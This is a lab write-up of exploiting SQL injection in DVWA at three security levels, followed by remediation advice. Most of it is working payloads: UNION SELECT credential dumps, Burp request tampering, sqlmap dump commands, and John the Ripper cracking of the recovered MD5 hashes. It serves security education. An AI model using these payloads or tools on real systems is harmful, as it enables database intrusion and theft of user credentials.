# Lab Write-Up: SQL Injection (SQLi)
**Date:** 2026-08-20  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Injection  
**OWASP Top 10:** A03:2021 – Injection  

---

## 1. Introduction

SQL Injection (SQLi) is one of the most critical and widespread vulnerabilities found in web applications. It occurs when an attacker is able to inject malicious SQL code into a query that an application sends to its backend database. This allows an attacker to view, modify, or delete data they are not normally authorized to access — including user credentials, personal data, and administrative records.

**Goal of this lab:** Exploit the SQL Injection vulnerability in DVWA to extract all user credentials (usernames and password hashes) from the backend database.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA (Damn Vulnerable Web Application) |
| **Database**     | MariaDB / MySQL                      |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser, Burp Suite, SQLMap, John the Ripper, hashid |
| **Network**      | Local lab (NAT/Host-Only)            |

**Pre-requisites:**
- DVWA is running and accessible (e.g., `http://192.168.x.x/dvwa` or `http://localhost/dvwa`)
- Logged in as `admin` / `password`
- Security level set appropriately per test

---

## 3. Vulnerability Overview

### What is SQL Injection?

SQL Injection exploits insufficient input sanitization. When user-supplied input is directly embedded into a SQL query without proper validation or parameterization, an attacker can alter the query's logic.

**Vulnerable Code Example (PHP):**
```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

By injecting a single quote `'`, we can break the query syntax and confirm exploitability. From there, using `UNION SELECT` statements, we can extract data from other tables.

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → SQL Injection. Set security to **Low**.

#### Step 1 – Confirm Normal Behavior

Enter `1` in the User ID field and submit.

**Expected Output:**
```
ID: 1
First name: admin
Surname: admin
```

#### Step 2 – Test for Injection (Single Quote Test)

**Payload:**
```
'
```

**Result:** Blank page or MySQL error — confirms the application is **vulnerable** to SQL injection (input is not sanitized).

#### Step 3 – Boolean-Based Confirm

**Payload:**
```
1' OR '1'='1'#
```

**Result:** All users are returned — confirms injection is working.

```
ID: 1' OR '1'='1'#
First name: admin
Surname: admin

ID: 1' OR '1'='1'#
First name: Gordon
Surname: Brown
... (all 5 users)
```

#### Step 4 – Determine Column Count

Before a UNION attack, we need to know the number of columns the original query returns. Test with ORDER BY:

**Payloads:**
```
1' ORDER BY 1#    → Works
1' ORDER BY 2#    → Works
1' ORDER BY 3#    → Error
```

**Conclusion:** The query returns **2 columns**.

#### Step 5 – Find Displayable Columns

**Payload:**
```
1' UNION SELECT NULL, NULL#
```

Then test which columns display text:

**Payload:**
```
1' UNION SELECT 'col1_test', 'col2_test'#
```

**Result:** Both columns display output — both columns are injectable.

#### Step 6 – Extract Database Information

**Get current database name:**
```
1' UNION SELECT database(), NULL#
```
**Output:** `dvwa`

**Get current database user:**
```
1' UNION SELECT user(), NULL#
```
**Output:** `dvwauser@localhost`

#### Step 7 – Extract Table Names

**Payload:**
```
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
```

**Output:**
```
guestbook
users
```

#### Step 8 – Extract Column Names from `users` Table

**Payload:**
```
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'#
```

**Output:**
```
user_id
first_name
last_name
user
password
avatar
last_login
failed_login
```

#### Step 9 – Dump User Credentials

**Payload:**
```
1' UNION SELECT user, password FROM users#
```

**Output:**
```
First name: admin       Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb     Surname: e99a18c428cb38d5f260853678922e03
First name: 1337        Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo       Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

#### Step 10 – Identify Hash Type

```bash
hashid 5f4dcc3b5aa765d61d8327deb882cf99
```

**Output:** `MD5`

#### Step 11 – Crack the Hashes

Save hashes to a file `hashes.txt`:
```
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
```

Crack with John the Ripper:
```bash
john --format=Raw-MD5 hashes.txt --wordlist=/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt
```

**Cracked Passwords:**
```
admin    → password
gordonb  → abc123
1337     → charley
pablo    → letmein
smithy   → password
```

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The User ID input is now a **dropdown menu** (no direct text input). The request uses POST method.

#### Step 1 – Intercept with Burp Suite

1. Open Burp Suite → ensure the browser proxy is set to `127.0.0.1:8080`
2. Enable **Intercept** in Proxy tab
3. Select any user from the dropdown and click Submit
4. Catch the POST request in Burp

**Intercepted POST body:**
```
id=1&Submit=Submit
```

#### Step 2 – Send to Repeater

Right-click the request → **Send to Repeater**

#### Step 3 – Inject via Repeater

Modify the `id` parameter directly:

**Payload:**
```
id=1 UNION SELECT user, password FROM users#&Submit=Submit
```

> **Note:** No single quotes needed here because the medium level uses `mysql_real_escape_string()`, but the query still lacks quotes around the integer parameter — making it injectable without quotes.

**Result:** Same credentials dumped as Low level.

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** A **"Click here to change your ID"** link opens a **separate popup window** to submit the User ID. This is an anti-automation measure.

#### Step 1 – Use the Popup Window

1. Click **"Click here to change your ID"**
2. A new small window opens with a text input field

#### Step 2 – Inject Directly

Enter the payload in the popup's input field:

**Payload:**
```
1' UNION SELECT user, password FROM users#
```

3. Submit and close the popup
4. The main page refreshes with the results

**Result:** All credentials are displayed — same outcome as Low level.

> **Why does High level fail?** The developer added the popup as a client-side obstacle but did **not** fix the underlying server-side SQL query. The injection still works because the backend is still vulnerable.

---

## 5. Automated Testing with SQLMap

For efficiency, **SQLMap** can automate the entire discovery and extraction process.

### Step 1 – Capture the Cookie

Log into DVWA and grab your session cookie from the browser (DevTools → Application → Cookies):
```
PHPSESSID=abc123xyz; security=low
```

### Step 2 – Run SQLMap

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123xyz; security=low" \
  --dbs
```

**Output:**
```
available databases:
[*] dvwa
[*] information_schema
```

### Step 3 – Dump the Users Table

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123xyz; security=low" \
  -D dvwa -T users --dump
```

**Output:** Full table with usernames and cracked passwords (SQLMap attempts hash cracking automatically).

---

## 6. Findings Summary

| Security Level | Vulnerable | Method Used          | Data Extracted       |
|----------------|------------|----------------------|----------------------|
| Low            | ✅ Yes     | Manual UNION-based   | All user credentials |
| Medium         | ✅ Yes     | Burp Suite Repeater  | All user credentials |
| High           | ✅ Yes     | Popup bypass         | All user credentials |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.8      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: Medium |

**Business Impact:**
- Full exposure of user credentials
- Potential for account takeover
- Lateral movement into other systems using reused passwords
- Regulatory/compliance violations (GDPR, PCI-DSS)

---

## 8. Remediation Recommendations

| Fix                              | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Parameterized Queries**        | Use prepared statements with bound parameters (e.g., PDO in PHP)           |
| **Stored Procedures**            | Encapsulate DB logic to separate SQL from input                             |
| **Input Validation**             | Whitelist allowed input types (e.g., integers only for ID fields)           |
| **Least Privilege**              | DB user should only have SELECT access, not write/admin                     |
| **WAF (Web Application Firewall)** | Deploy WAF rules to detect/block SQLi patterns                            |
| **Error Handling**               | Never expose raw SQL errors to users                                        |
| **Password Hashing**             | Use bcrypt/Argon2 instead of unsalted MD5                                   |

**Secure Code Fix (PHP):**
```php
// Vulnerable
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";

// Secure (PDO Prepared Statement)
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

---

## 9. References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [Understanding SQL Injection – DVWA Low Level (Medium)](https://medium.com/@rodrigocousi/understanding-sql-injection-attacks-using-the-dvwa-application-low-level-part-one-06576bc16f9e)
- [DVWA SQLi Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/sqli_dvwa_walkthrough/)
- [SQLMap Documentation](https://sqlmap.org/)
- [John the Ripper](https://www.openwall.com/john/)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA - SQL Injection Module
Payload:   1' UNION SELECT user, password FROM users#
Result:    Extracted 5 user credential pairs with MD5 hashes
Cracked:   All 5 passwords cracked using John the Ripper
Severity:  CRITICAL
```
---
*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
